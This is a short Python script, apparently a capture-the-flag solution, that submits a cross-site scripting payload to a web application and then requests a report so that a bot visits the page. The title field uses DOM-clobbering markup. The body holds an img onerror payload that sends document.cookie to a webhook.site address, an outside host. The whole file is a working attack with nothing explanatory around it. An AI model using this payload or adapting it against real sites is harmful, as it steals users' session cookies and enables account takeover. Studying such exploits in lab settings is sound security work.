import requests

url = "https://sanity.amt.rs"
webhok_url = "https://webhook.site/8c7df36e-9978-405d-af42-fc4654877660/"
r = requests.post(f"{url}/submit", json={
    "title": '<a href="https://0xazr.github.io/" id="debug" name="extension"/> <b id="debug"/>',
    "body": f"<img src=x onerror=fetch('{webhok_url}?'+document.cookie)>"
})

r = requests.get(f"{url}/report/{r.text}")

print(r.text)